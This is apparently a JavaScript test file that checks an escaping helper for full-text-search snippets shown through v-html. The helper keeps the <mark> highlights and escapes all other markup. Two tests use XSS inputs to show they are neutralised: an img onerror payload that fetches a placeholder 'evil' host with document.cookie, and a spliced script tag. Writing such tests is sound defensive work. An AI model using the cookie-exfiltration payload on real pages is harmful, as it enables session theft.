import assert from 'node:assert/strict'
import test from 'node:test'

import { escapeFtsSnippetMarkup, escapeHtml } from '../app/utils/searchSnippetMarkup.ts'

test( 'escapeHtml covers the five characters that matter in markup', () => {
	assert.equal( escapeHtml( '&<>"\'' ), '&amp;&lt;&gt;&quot;&#39;' )
	assert.equal( escapeHtml( 'plain text' ), 'plain text' )
} )

test( 'an FTS snippet keeps its highlight tags', () => {
	assert.equal(
		escapeFtsSnippetMarkup( 'the <mark>pageviews</mark> endpoint' ),
		'the <mark>pageviews</mark> endpoint'
	)
} )

test( 'an FTS snippet escapes the page text around the highlights', () => {
	// The literal tag 22 imported pages carry today, as inline code.
	assert.equal(
		escapeFtsSnippetMarkup( 'the <languages /> <mark>tag</mark>' ),
		'the &lt;languages /&gt; <mark>tag</mark>'
	)
} )

test( 'an FTS snippet cannot smuggle a script through v-html', () => {
	const escaped = escapeFtsSnippetMarkup(
		'<img src=x onerror="fetch(\'//evil/\'+document.cookie)"> <mark>translate</mark>'
	)

	assert.ok( !escaped.includes( '<img' ) )
	assert.ok( !escaped.includes( 'onerror="' ) )
	assert.ok( escaped.includes( '&lt;img' ) )
	assert.ok( escaped.includes( '<mark>translate</mark>' ) )
} )

test( 'a closing tag spliced next to a highlight stays escaped', () => {
	const escaped = escapeFtsSnippetMarkup( '<mark>x</mark></bdi><script>alert(1)</script>' )

	assert.ok( !escaped.includes( '</bdi>' ) )
	assert.ok( !escaped.includes( '<script>' ) )
	assert.ok( escaped.startsWith( '<mark>x</mark>' ) )
} )

test( 'page text that literally says mark degrades to a highlight, not markup', () => {
	// The one trade the escape-then-restore order makes: a bare tag, no
	// attributes and no script, rather than parsing hostile markup to tell.
	assert.equal( escapeFtsSnippetMarkup( 'about <mark>' ), 'about <mark>' )
} )

test( 'an absent snippet stays absent rather than becoming an empty string', () => {
	assert.equal( escapeFtsSnippetMarkup( undefined ), undefined )
	assert.equal( escapeFtsSnippetMarkup( '' ), '' )
} )
